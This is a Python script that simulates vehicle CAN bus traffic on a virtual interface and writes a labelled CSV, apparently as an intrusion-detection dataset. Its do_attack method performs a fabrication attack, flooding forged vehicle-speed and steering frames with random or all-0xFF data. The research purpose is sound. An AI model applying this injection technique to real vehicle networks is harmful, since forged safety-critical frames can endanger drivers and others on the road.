import os
import can
import random
import time
import binascii
import cantools
from threading import Thread, Lock


class Fabrication:

    def __init__(self):
        self.bus_ENGINE = None
        self.bus_EngineTorqueECU = None
        self.bus_PowerDisplay = None
        self.bus_GEAR = None
        self.bus_VehicleSpeed = None
        self.when_perform_attack = 10
        self.channel = 'vcan0'
        self.interface = 'socketcan'
        self.wait_lock = Lock()
        self.name_file = 'fabrication_attack_v2.csv'
        self.path_saved_dataset = 'path'

    def write_into_file(self, name_file, message, label):

        s = str(binascii.hexlify(message.data))[2:].replace('\'', '')
        st = []
        for i in range(0, len(s) - 2, 2):
            st.append(s[i] + s[i + 1] + ',')

        st.append(s[len(s) - 2] + s[len(s) - 1])
        data = ''.join(st)

        with self.wait_lock:
            with open(os.path.join(self.path_saved_dataset, name_file), 'a') as f:
                f.write(str(time.time() * 1000) + ',')
                f.write(str(message.arbitration_id) + ',')
                f.write(hex(message.arbitration_id)[2:] + ',')
                f.write(str(message.dlc) + ',')
                f.write(data + ',')
                f.write(str(label) + '\n')
            f.close()


    def do_attack(self):
        
        # Cho et al. ECU compromised to be a strong attacker, the adversary fabricates 
        # and injects messages with forged ID, DLC, and data

        random_data = True
        time.sleep(self.when_perform_attack)
        i = can.ThreadSafeBus(channel=self.channel, interface=self.interface)

        while True:
            if random_data:
                message_attack_VEHICLE_SPEED = can.Message(arbitration_id=1080, data=bytearray(os.urandom(8)))
                message_STEER = can.Message(arbitration_id=1100, data=bytearray(os.urandom(8)))
                for _ in range(0, 100):
                    self.write_into_file(self.name_file, message_attack_VEHICLE_SPEED, 1)
                    self.write_into_file(self.name_file, message_STEER, 1)
                    i.send(message_attack_VEHICLE_SPEED)
                    i.send(message_STEER)

            else:
                message_attack_VEHICLE_SPEED = can.Message(arbitration_id=1080, data=b'\xff\xff\xff\xff\xff\xff\xff\xff')
                message_STEER = can.Message(arbitration_id=1100, data=b'\xff\xff\xff\xff\xff\xff\xff\xff')
                for _ in range(0, 100):
                    self.write_into_file(self.name_file, message_attack_VEHICLE_SPEED, 1)
                    self.write_into_file(self.name_file, message_STEER, 1)
                    i.send(message_attack_VEHICLE_SPEED)
                    i.send(message_STEER)
            time.sleep(self.when_perform_attack)


    def vehicle_speed(self, dbc_instance):
        i = can.ThreadSafeBus(channel=self.channel, interface=self.interface)
        

        VehicleSpeed = dbc_instance.get_message_by_name('VEHICLE_SPEED')
        
        while True:

            message_recv = i.recv()

            if message_recv.arbitration_id == 1090:
                decoded_message = dbc_instance.decode_message(message_recv.arbitration_id, message_recv.data)
                km = decoded_message.get('WHL_SPD_FL')
                
                data = VehicleSpeed.encode({'WHEEL_VEHICLE_SPEED': int(km)})

                frame_id_VehicleSpeed = VehicleSpeed.frame_id

                message = can.Message(arbitration_id=frame_id_VehicleSpeed, data=data)

                self.write_into_file(self.name_file, message, 0)

                i.send(message)

                time.sleep(0.05)

    def wheel_speed_sensors(self, dbc_instance):
        i = can.ThreadSafeBus(channel=self.channel, interface=self.interface)

        WheelSpeedSensors = dbc_instance.get_message_by_name('WHEEL_SPEED')

        while True:

            sensors_vehicle = random.randint(0, 200)
            data = WheelSpeedSensors.encode({'WHL_SPD_FL': sensors_vehicle,
                                             'WHL_SPD_FR': sensors_vehicle,
                                             'WHL_SPD_RL': sensors_vehicle,
                                             'WHL_SPD_RR': sensors_vehicle})
            frame_id_wheel_sensors = WheelSpeedSensors.frame_id

            message = can.Message(arbitration_id=frame_id_wheel_sensors, data=data)

            self.write_into_file(self.name_file, message, 0)

            i.send(message)

            time.sleep(0.02)

    def steer_angle(self, dbc_instance):

        i = can.ThreadSafeBus(channel=self.channel, interface=self.interface)

        SteerAngle = dbc_instance.get_message_by_name('STEER')

        while True:
            generate_angle = random.uniform(0, 20)
            data = SteerAngle.encode({'STEER_ANGLE': generate_angle})
            frame_id_angle = SteerAngle.frame_id

            message = can.Message(arbitration_id=frame_id_angle, data=data)

            self.write_into_file(self.name_file, message, 0)

            i.send(message)

            time.sleep(0.04)

    def brake_pedal(self, dbc_instance):

        i = can.ThreadSafeBus(channel=self.channel, interface=self.interface)

        BrakPedal = dbc_instance.get_message_by_name('BRAKE_PEDAL')

        while True:
            message_recv = i.recv()

            if message_recv.arbitration_id == 1080:
                decoded_message = dbc_instance.decode_message(message_recv.arbitration_id, message_recv.data)

                if decoded_message.get('WHEEL_VEHICLE_SPEED') > 0:

                    data = BrakPedal.encode({'NOT_BRAKE_PEDAL_PRESSED': 1, 'BRAKE_PEDAL_PRESSED': 0})
                    brake_message = can.Message(arbitration_id=BrakPedal.frame_id, data=data)
                    self.write_into_file(self.name_file, brake_message, 0)
                    i.send(brake_message)
                else:
                    data = BrakPedal.encode({'NOT_BRAKE_PEDAL_PRESSED': 0, 'BRAKE_PEDAL_PRESSED': 1})
                    brake_message = can.Message(arbitration_id=BrakPedal.frame_id, data=data)
                    self.write_into_file(self.name_file, brake_message, 0)
                    i.send(brake_message)
            time.sleep(0.03)

    def rpm_speed(self, dbc_instance):
        self.bus_ENGINE = can.ThreadSafeBus(channel=self.channel, interface=self.interface)
        
        ENGINE = dbc_instance.get_message_by_name('ENGINE')
        while True:
            RPM_speed = random.randint(1, 3000)
            data = ENGINE.encode({'ENGINE_SPEED_ROTATION': RPM_speed})
            frame_id_rpm = ENGINE.frame_id

            message = can.Message(arbitration_id=frame_id_rpm, data=data)

            self.write_into_file(self.name_file, message, 0)
            
            self.bus_ENGINE.send(message)
            time.sleep(0.08)


    def gear_vehicle(self, dbc_instance):
        self.bus_GEAR = can.ThreadSafeBus(channel=self.channel, interface=self.interface)

        while True:
            message = self.bus_GEAR.recv()
            GEAR_vehicle = dbc_instance.get_message_by_name('GEAR')
            frame_id_gear = GEAR_vehicle.frame_id

            if message.arbitration_id == 1080:
                decoded_message = dbc_instance.decode_message(message.arbitration_id, message.data)

                if decoded_message.get('WHEEL_VEHICLE_SPEED') > 0:
                    data = GEAR_vehicle.encode({'GEAR_SHIFTER': 5})  # D
                    gear_message = can.Message(arbitration_id=frame_id_gear, data=data)
                    self.write_into_file(self.name_file, gear_message, 0)
                    self.bus_GEAR.send(gear_message)
                else:
                    data = GEAR_vehicle.encode({'GEAR_SHIFTER': 0})  # P
                    gear_message = can.Message(arbitration_id=frame_id_gear, data=data)
                    self.write_into_file(self.name_file, gear_message, 0)
                    self.bus_GEAR.send(gear_message)
            time.sleep(0.1)


    def engine_torque(self, dbc_instance):
        self.bus_EngineTorqueECU = can.ThreadSafeBus(channel=self.channel, interface=self.interface)

        while True:
            engine_torque = random.randint(-200, 200)

            EngineTorqueECU = dbc_instance.get_message_by_name('ENGINE_TORQUE')

            data = EngineTorqueECU.encode({'TORQUE': engine_torque})

            frame_id = EngineTorqueECU.frame_id

            message = can.Message(arbitration_id=frame_id, data=data)

            self.write_into_file(self.name_file, message, 0)

            self.bus_EngineTorqueECU.send(message)

            time.sleep(0.02)


def main():

    fabrication = Fabrication()

    path_dbc_file = 'vehicle.dbc'  # change this if u want to change the PATH

    db = cantools.database.load_file(path_dbc_file)

    thread_wheel_speed_sensor = Thread(target=fabrication.wheel_speed_sensors, args=(db,))
    thread_steer_angle = Thread(target=fabrication.steer_angle, args=(db,))
    thread_brake_pedal = Thread(target=fabrication.brake_pedal, args=(db,))
    thread_rpm_speed = Thread(target=fabrication.rpm_speed, args=(db,))
    thread_vehicle_speed = Thread(target=fabrication.vehicle_speed, args=(db,))
    thread_engine_torque = Thread(target=fabrication.engine_torque, args=(db,))
    thread_do_attack = Thread(target=fabrication.do_attack)

    thread_wheel_speed_sensor.start()
    thread_steer_angle.start()
    thread_brake_pedal.start()
    thread_vehicle_speed.start()
    thread_rpm_speed.start()
    thread_engine_torque.start()
    thread_do_attack.start()


if __name__ == '__main__':
    main()
